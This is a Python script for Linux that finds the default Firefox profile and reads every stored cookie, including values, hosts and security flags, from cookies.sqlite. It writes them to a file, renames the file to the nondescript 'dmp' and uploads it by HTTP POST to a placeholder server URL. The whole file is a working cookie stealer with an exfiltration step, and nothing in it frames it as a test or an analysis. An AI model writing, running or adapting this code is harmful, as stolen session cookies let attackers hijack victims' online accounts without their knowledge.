import os
import sqlite3
import json
import requests
import platform
import sys
import traceback

def get_firefox_cookies(browser_path):
    # Construct the path to the cookies SQLite database
    cookies_db_path = os.path.join(browser_path, 'cookies.sqlite')

    # Connect to the SQLite database
    conn = sqlite3.connect(cookies_db_path)
    cursor = conn.cursor()

    # Query to retrieve all cookies
    cursor.execute("SELECT name, value, host, path, isSecure, expiry, lastAccessed, isHttpOnly, inBrowserElement FROM moz_cookies")

    # Fetch all rows
    cookies = cursor.fetchall()

    # Close the database connection
    conn.close()

    # Convert the results to a list of dictionaries
    cookies_list = []
    for cookie in cookies:
        cookies_list.append({
            'name': cookie[0],
            'value': cookie[1],
            'host': cookie[2],
            'path': cookie[3],
            'secure': cookie[4],
            'expires_utc': cookie[5],
            'lastAccessed': cookie[6],
            'http_only': cookie[7],
            'inBrowserElement': cookie[8]
        })

    return cookies_list

def write_to_file(cookies, filename):
    with open(filename, 'w') as file:
        for cookie in cookies:
            file.write(json.dumps(cookie) + '\n')

def rename_file(old_name, new_name):
    os.rename(old_name, new_name)

def send_file_to_server(file_path, server_url):
    with open(file_path, 'rb') as file:
        files = {'file': file}
        response = requests.post(server_url, files=files)
        return response.status_code

def log_error(error_message):
    error_log_path = os.path.join(os.path.dirname(sys.executable), 'error_log.txt')
    with open(error_log_path, 'a') as error_log:
        error_log.write(error_message + '\n')

def main():
    system = platform.system()
    if system != 'Linux':
        print("This script is designed for Linux systems.")
        return

    # Construct the path to the Firefox profile directory
    home_directory = os.path.expanduser("~")
    firefox_profile_path = os.path.join(home_directory, '.mozilla', 'firefox')

    # Find the default profile directory
    default_profile = None
    for item in os.listdir(firefox_profile_path):
        if item.endswith('.default-release'):
            default_profile = item
            break

    if not default_profile:
        log_error("Default Firefox profile not found.")
        return

    browser_path = os.path.join(firefox_profile_path, default_profile)

    cookies = []
    try:
        cookies = get_firefox_cookies(browser_path)
        if not cookies:
            log_error("No cookies found.")
    except Exception as e:
        log_error(f'Error retrieving cookies: {e}')
        log_error(traceback.format_exc())
        return

    output_directory = os.path.dirname(sys.executable)
    filename = os.path.join(output_directory, 'cookies.txt')
    try:
        write_to_file(cookies, filename)
    except Exception as e:
        log_error(f'Error writing to file: {e}')
        log_error(traceback.format_exc())
        return

    renamed_filename = os.path.join(output_directory, 'dmp')
    try:
        rename_file(filename, renamed_filename)
    except Exception as e:
        log_error(f'Error renaming file: {e}')
        log_error(traceback.format_exc())
        return

    server_url = 'http://example.com/upload'
    try:
        status_code = send_file_to_server(renamed_filename, server_url)
        print(f'File sent to server. Status code: {status_code}')
    except Exception as e:
        log_error(f'Error sending file to server: {e}')
        log_error(traceback.format_exc())

if __name__ == '__main__':
    main()